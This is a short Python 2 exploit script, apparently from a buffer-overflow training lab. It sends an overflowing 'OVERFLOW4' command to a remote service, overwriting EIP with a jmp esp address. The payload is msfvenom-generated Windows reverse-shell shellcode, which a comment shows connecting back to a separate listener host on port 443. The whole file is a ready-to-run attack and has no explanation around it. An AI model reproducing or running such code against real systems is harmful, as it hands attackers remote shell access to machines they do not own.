#!/usr/bin/python

import sys
import socket, time
from struct import *


remoteip="10.10.87.148"
remoteport=1337
offset = "A" * 2026
#jmp esp 625011AF
eip = "\xaf\x11\x50\x62"

#msfvenom -p windows/shell_reverse_tcp lhost=10.13.46.217 lport=443 exitfunc=thread -b "\x00\xa9\xcd\xd4" -v esp -f python
esp =  b"\x90" * 16
esp += b"\xdb\xdc\xbb\xdd\x14\xa2\x3c\xd9\x74\x24\xf4\x5a\x31"
esp += b"\xc9\xb1\x52\x83\xea\xfc\x31\x5a\x13\x03\x87\x07\x40"
esp += b"\xc9\xcb\xc0\x06\x32\x33\x11\x67\xba\xd6\x20\xa7\xd8"
esp += b"\x93\x13\x17\xaa\xf1\x9f\xdc\xfe\xe1\x14\x90\xd6\x06"
esp += b"\x9c\x1f\x01\x29\x1d\x33\x71\x28\x9d\x4e\xa6\x8a\x9c"
esp += b"\x80\xbb\xcb\xd9\xfd\x36\x99\xb2\x8a\xe5\x0d\xb6\xc7"
esp += b"\x35\xa6\x84\xc6\x3d\x5b\x5c\xe8\x6c\xca\xd6\xb3\xae"
esp += b"\xed\x3b\xc8\xe6\xf5\x58\xf5\xb1\x8e\xab\x81\x43\x46"
esp += b"\xe2\x6a\xef\xa7\xca\x98\xf1\xe0\xed\x42\x84\x18\x0e"
esp += b"\xfe\x9f\xdf\x6c\x24\x15\xfb\xd7\xaf\x8d\x27\xe9\x7c"
esp += b"\x4b\xac\xe5\xc9\x1f\xea\xe9\xcc\xcc\x81\x16\x44\xf3"
esp += b"\x45\x9f\x1e\xd0\x41\xfb\xc5\x79\xd0\xa1\xa8\x86\x02"
esp += b"\x0a\x14\x23\x49\xa7\x41\x5e\x10\xa0\xa6\x53\xaa\x30"
esp += b"\xa1\xe4\xd9\x02\x6e\x5f\x75\x2f\xe7\x79\x82\x50\xd2"
esp += b"\x3e\x1c\xaf\xdd\x3e\x35\x74\x89\x6e\x2d\x5d\xb2\xe4"
esp += b"\xad\x62\x67\xaa\xfd\xcc\xd8\x0b\xad\xac\x88\xe3\xa7"
esp += b"\x22\xf6\x14\xc8\xe8\x9f\xbf\x33\x7b\xaa\x32\x15\xa2"
esp += b"\xc2\x4e\x69\x55\xa8\xc6\x8f\x3f\xde\x8e\x18\xa8\x47"
esp += b"\x8b\xd2\x49\x87\x01\x9f\x4a\x03\xa6\x60\x04\xe4\xc3"
esp += b"\x72\xf1\x04\x9e\x28\x54\x1a\x34\x44\x3a\x89\xd3\x94"
esp += b"\x35\xb2\x4b\xc3\x12\x04\x82\x81\x8e\x3f\x3c\xb7\x52"
esp += b"\xd9\x07\x73\x89\x1a\x89\x7a\x5c\x26\xad\x6c\x98\xa7"
esp += b"\xe9\xd8\x74\xfe\xa7\xb6\x32\xa8\x09\x60\xed\x07\xc0"
esp += b"\xe4\x68\x64\xd3\x72\x75\xa1\xa5\x9a\xc4\x1c\xf0\xa5"
esp += b"\xe9\xc8\xf4\xde\x17\x69\xfa\x35\x9c\x89\x19\x9f\xe9"
esp += b"\x21\x84\x4a\x50\x2c\x37\xa1\x97\x49\xb4\x43\x68\xae"
esp += b"\xa4\x26\x6d\xea\x62\xdb\x1f\x63\x07\xdb\x8c\x84\x02"

buffer = offset + eip + esp

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((remoteip, remoteport))

print s.recv(1024)
s.send("OVERFLOW4 " + buffer + '\r\n')
print s.recv(1024)
s.close()
print "-------------------------"
